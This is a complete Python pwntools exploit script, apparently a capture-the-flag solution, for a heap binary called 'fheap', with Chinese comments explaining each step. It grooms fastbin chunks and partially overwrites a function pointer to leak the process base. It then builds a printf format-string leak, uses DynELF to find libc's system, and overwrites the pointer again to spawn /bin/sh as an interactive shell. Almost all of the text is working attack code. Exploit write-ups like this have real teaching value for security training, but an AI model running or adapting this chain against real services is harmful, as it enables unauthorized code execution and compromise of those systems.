#coding:utf-8
from pwn import *

def f_create(p, data_length, f_data):
    p.recvuntil("quit\n")
    p.send("create ")
    p.recvuntil("size:")
    p.sendline(str(data_length))
    p.recvuntil('str:')
    p.send(f_data)

def f_delete(p, d_id):
    p.recvuntil('quit\n')
    p.send('delete ')
    p.recvuntil('id:')
    p.sendline(str(d_id))
    p.recvuntil('Are you sure?:')
    p.send('yes')

def f_quit(p):
    p.recvuntil('quit\n')
    p.send('quit ')

f_debug = False
f_local = False
if f_debug:
    context.log_level = 'debug'
if f_local:
    p = process('./fheap')
else:
    p = remote('127.0.0.1', 22333)

def leak(addr):
    # 这里用printf进行格式化泄露
    print 'leaking address:', hex(addr)
    data = 'AA%9$s' + '#'*(0x18-len('AA%9$s')) + p64(printf_plt)
    f_create(p, 0x20, data)
    p.recvuntil('quit')
    p.send('delete ')
    p.recvuntil('id:')
    p.send(str(1)+'\n')
    p.recvuntil('sure?')
    p.send('yes01234'+p64(addr))
    p.recvuntil('AA')
    data = p.recvuntil('####')[:-4]
    data += '\x00'
    print 'leaked data:', data
    f_delete(p, 0)
    return data
    
def fheap_pwn():
    global printf_plt
    # 申请2个大小小于0xf的堆块然后释放，这样就在fastbin中有了2个大小为0x20的堆
    f_create(p, 4, 'aaa\n')
    f_create(p, 4, 'bbb\n')
    f_delete(p, 1)
    f_delete(p, 0)
    # 将free函数末尾覆盖成puts 泄露出free对应的地址 然后计算出基址
    data = 'a'*0x10 + 'b'*0x8 + '\x2d' + '\x00'
    f_create(p, 0x20, data)
    f_delete(p, 1)
    p.recvuntil('b'*0x8)
    data = p.recvuntil('1.')[:-3] # 注意截取字符串位置
    if len(data) > 8:
        data = data[:8]
    data = u64(data.ljust(8, '\x00'))
    proc_base = data-0xd2d
    print 'the base address of the process:', hex(proc_base)
    # 由基址计算出printf函数地址
    printf_plt = proc_base + 0x9d0
    print 'printf_plt address:', hex(printf_plt)
    f_delete(p, 0)

    raw_input('----------------------test leak------------------------------')
    # 这里一定要return一次 因为之前是把free覆盖为call(puts)的地址
    # 即变成了 call(call(puts)) 所以要先返回一次
    f_quit(p)
    # 检测leak函数能否leak
    leak(proc_base+0x1224)

    # 泄露system地址
    raw_input('start leak?')
    d = DynELF(leak, proc_base, elf=ELF('./fheap'))
    system_addr = d.lookup('system', 'libc')
    print 'system address:', hex(system_addr)
    # system binsh
    data = '/bin/sh;' + '#'*(0x18-len('/bin/sh;')) + p64(system_addr)
    f_create(p, 0x20, data)
    f_delete(p, 1)
    p.interactive()

fheap_pwn()

